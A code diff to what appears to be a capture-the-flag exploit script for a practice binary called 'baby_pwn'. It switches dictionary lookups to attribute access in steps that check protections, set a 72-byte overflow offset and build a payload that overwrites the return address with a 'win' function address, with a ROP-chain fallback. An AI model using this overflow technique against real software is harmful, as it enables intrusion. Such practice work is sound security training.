@@ -18,10 +18,10 @@ make_executable("./baby_pwn")
 
 print("[*] Step 2: Quick binary analysis...")
 let checksec_result = checksec("./baby_pwn")
-print("    Arch: " + checksec_result["arch"])
-print("    NX: " + str(checksec_result["nx"]))
-print("    PIE: " + str(checksec_result["pie"]))
-print("    Canary: " + str(checksec_result["canary"]))
+print("    Arch: " + checksec_result.arch)
+print("    NX: " + str(checksec_result.nx))
+print("    PIE: " + str(checksec_result.pie))
+print("    Canary: " + str(checksec_result.canary))
 
 # Step 2: Test locally
 print("\n[*] Step 3: Testing locally...")
@@ -51,7 +51,7 @@ print("\n[*] Step 5: Building exploit...")
 let offset = 72  # From crash analysis
 
 # Check if we need to leak addresses
-if checksec_result["pie"]
+if checksec_result.pie
     print("    [*] PIE enabled - need to leak addresses")
     let leak_session = process("./baby_pwn")
     let binary_leak = perform_leak(leak_session)
@@ -62,9 +62,9 @@ end
 # Find win function or build ROP chain
 let elf = parse_elf("./baby_pwn")
 
-if "win" in elf["symbols"]
-    print("    [+] Found win function @ " + hex(elf["symbols"]["win"]))
-    let win_addr = elf["symbols"]["win"]
+if "win" in elf.symbols
+    print("    [+] Found win function @ " + hex(elf.symbols.win))
+    let win_addr = elf.symbols.win
     let payload = cyclic(offset) + p64(win_addr)
 else
     print("    [*] No win function, building ROP chain...")
